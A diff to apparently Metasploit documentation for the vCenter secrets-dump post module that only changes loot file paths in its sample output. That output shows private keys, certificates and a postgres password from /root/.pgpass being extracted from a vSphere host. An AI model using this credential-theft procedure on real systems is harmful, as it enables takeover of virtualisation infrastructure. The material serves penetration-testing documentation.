@@ -312,24 +312,24 @@ msf6 post(linux/gather/vcenter_secrets_dump) > run
 WARNING:  there is already a transaction in progress
 [-] Error processing LDIF file
 [*] Extracting certificates from vSphere platform
-[+] VMCA_ROOT key: /home/h00die/.msf4/loot/20221102165124_default_2.2.2.2_vmca_523828.key
-[+] VMCA_ROOT cert: /home/h00die/.msf4/loot/20221102165124_default_2.2.2.2_vmca_694934.pem
-[+] SSO_STS_IDP key: /home/h00die/.msf4/loot/20221102165125_default_2.2.2.2_idp_031902.key
-[+] SSO_STS_IDP cert: /home/h00die/.msf4/loot/20221102165125_default_2.2.2.2_idp_256763.pem
-[+] MACHINE_SSL_CERT Key: /home/h00die/.msf4/loot/20221102165126_default_2.2.2.2___MACHINE_CERT_448485.key
-[+] MACHINE_SSL_CERT Cert: /home/h00die/.msf4/loot/20221102165126_default_2.2.2.2___MACHINE_CERT_793765.pem
-[+] MACHINE Key: /home/h00die/.msf4/loot/20221102165127_default_2.2.2.2_machine_336860.key
-[+] MACHINE Cert: /home/h00die/.msf4/loot/20221102165127_default_2.2.2.2_machine_588424.pem
-[+] VSPHERE-WEBCLIENT Key: /home/h00die/.msf4/loot/20221102165127_default_2.2.2.2_vspherewebclien_567378.key
-[+] VSPHERE-WEBCLIENT Cert: /home/h00die/.msf4/loot/20221102165127_default_2.2.2.2_vspherewebclien_997605.pem
-[+] VPXD Key: /home/h00die/.msf4/loot/20221102165128_default_2.2.2.2_vpxd_521342.key
-[+] VPXD Cert: /home/h00die/.msf4/loot/20221102165128_default_2.2.2.2_vpxd_415704.pem
-[+] VPXD-EXTENSION Key: /home/h00die/.msf4/loot/20221102165128_default_2.2.2.2_vpxdextension_152066.key
-[+] VPXD-EXTENSION Cert: /home/h00die/.msf4/loot/20221102165128_default_2.2.2.2_vpxdextension_359784.pem
-[+] DATA-ENCIPHERMENT Key: /home/h00die/.msf4/loot/20221102165129_default_2.2.2.2_dataenciphermen_517854.key
-[+] DATA-ENCIPHERMENT Cert: /home/h00die/.msf4/loot/20221102165129_default_2.2.2.2_dataenciphermen_408460.pem
-[+] SMS Key: /home/h00die/.msf4/loot/20221102165130_default_2.2.2.2_sms_self_signed_777691.key
-[+] SMS Cert: /home/h00die/.msf4/loot/20221102165130_default_2.2.2.2_sms_self_signed_215695.pem
+[+] VMCA_ROOT key: /root/.msf4/loot/20221102165124_default_2.2.2.2_vmca_523828.key
+[+] VMCA_ROOT cert: /root/.msf4/loot/20221102165124_default_2.2.2.2_vmca_694934.pem
+[+] SSO_STS_IDP key: /root/.msf4/loot/20221102165125_default_2.2.2.2_idp_031902.key
+[+] SSO_STS_IDP cert: /root/.msf4/loot/20221102165125_default_2.2.2.2_idp_256763.pem
+[+] MACHINE_SSL_CERT Key: /root/.msf4/loot/20221102165126_default_2.2.2.2___MACHINE_CERT_448485.key
+[+] MACHINE_SSL_CERT Cert: /root/.msf4/loot/20221102165126_default_2.2.2.2___MACHINE_CERT_793765.pem
+[+] MACHINE Key: /root/.msf4/loot/20221102165127_default_2.2.2.2_machine_336860.key
+[+] MACHINE Cert: /root/.msf4/loot/20221102165127_default_2.2.2.2_machine_588424.pem
+[+] VSPHERE-WEBCLIENT Key: /root/.msf4/loot/20221102165127_default_2.2.2.2_vspherewebclien_567378.key
+[+] VSPHERE-WEBCLIENT Cert: /root/.msf4/loot/20221102165127_default_2.2.2.2_vspherewebclien_997605.pem
+[+] VPXD Key: /root/.msf4/loot/20221102165128_default_2.2.2.2_vpxd_521342.key
+[+] VPXD Cert: /root/.msf4/loot/20221102165128_default_2.2.2.2_vpxd_415704.pem
+[+] VPXD-EXTENSION Key: /root/.msf4/loot/20221102165128_default_2.2.2.2_vpxdextension_152066.key
+[+] VPXD-EXTENSION Cert: /root/.msf4/loot/20221102165128_default_2.2.2.2_vpxdextension_359784.pem
+[+] DATA-ENCIPHERMENT Key: /root/.msf4/loot/20221102165129_default_2.2.2.2_dataenciphermen_517854.key
+[+] DATA-ENCIPHERMENT Cert: /root/.msf4/loot/20221102165129_default_2.2.2.2_dataenciphermen_408460.pem
+[+] SMS Key: /root/.msf4/loot/20221102165130_default_2.2.2.2_sms_self_signed_777691.key
+[+] SMS Cert: /root/.msf4/loot/20221102165130_default_2.2.2.2_sms_self_signed_215695.pem
 [*] Searching for secrets in VM Guest Customization Specification XML
 [!] No vpx_customization_spec entries evident
 [*] Retrieving .pgpass file
@@ -347,6 +347,6 @@ WARNING:  there is already a transaction in progress
 [+] .pgpass creds found: postgres, i23rYg+oPBQwpn!5 for 127.0.0.1:VCDB
 [+] .pgpass creds found: postgres, i23rYg+oPBQwpn!5 for /var/run/vpostgres:VCDB
 [+] .pgpass creds found: postgres, i23rYg+oPBQwpn!5 for /var/run/vpostgres:postgres
-[+] Saving the /root/.pgpass contents to /home/h00die/.msf4/loot/20221102165131_default_2.2.2.2_.pgpass_509065.txt
+[+] Saving the /root/.pgpass contents to /root/.msf4/loot/20221102165131_default_2.2.2.2_.pgpass_509065.txt
 [*] Post module execution completed
 ```
